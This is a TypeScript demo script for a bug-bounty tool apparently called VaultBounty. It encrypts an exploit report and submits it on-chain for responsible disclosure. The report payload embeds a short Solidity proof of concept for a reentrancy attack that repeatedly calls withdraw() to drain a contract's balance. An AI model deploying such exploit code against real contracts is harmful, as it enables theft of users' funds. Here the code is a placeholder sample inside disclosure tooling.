/**
 * Step 1: Researcher encrypts exploit and submits report on-chain.
 * Run: pnpm demo:submit
 *
 * Outputs: vault UUID + reportId - save these in .env for subsequent steps.
 */
import "dotenv/config";
import { getResearcherClients, CONTRACTS } from "../clients.js";
import { allocateExploitVault, submitReport } from "../vaultbounty.js";
import { BOUNTY_REGISTRY_ABI } from "../abis/index.js";

const EXPLOIT_PAYLOAD = JSON.stringify({
  targetContract: process.env.TARGET_CONTRACT ?? "0x0000000000000000000000000000000000000001",
  severity: "CRITICAL",
  description: "Reentrancy vulnerability in withdraw() allows draining entire contract balance.",
  pocCode: `
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;
    contract Exploit {
        IVulnerable target;
        constructor(address _target) { target = IVulnerable(_target); }
        function attack() external payable {
            target.deposit{value: msg.value}();
            target.withdraw();
        }
        receive() external payable {
            if (address(target).balance > 0) target.withdraw();
        }
    }
  `,
  impactEstimate: "100% fund drainage",
  submittedAt: new Date().toISOString(),
});

async function main() {
  console.log("=== VaultBounty: Submit Report ===\n");

  const { account, walletClient, publicClient, cdrClient } = await getResearcherClients();
  console.log("Researcher:", account.address);

  const targetContract = (process.env.TARGET_CONTRACT ?? "0x0000000000000000000000000000000000000001") as `0x${string}`;
  const company        = (process.env.COMPANY_ADDRESS ?? account.address) as `0x${string}`;

  // Allocate vault - pre-reads nextReportId so conditionData is correct from day one
  const { uuid, expectedReportId } = await allocateExploitVault(cdrClient, publicClient, account.address, EXPLOIT_PAYLOAD);
  console.log(`  Expected reportId: ${expectedReportId}`);

  // Submit on-chain report
  const reportId = await submitReport(walletClient, publicClient, uuid, targetContract, company);

  if (reportId !== expectedReportId) {
    console.warn(`⚠  reportId mismatch: expected ${expectedReportId}, got ${reportId}`);
    console.warn("   Another tx may have incremented nextReportId between allocate and submit.");
  }

  console.log("\n✅ Done!");
  console.log(`   VAULT_UUID=${uuid}`);
  console.log(`   REPORT_ID=${reportId}`);
  console.log("\nAdd these to your .env for the next steps.");
}

main().catch(console.error);
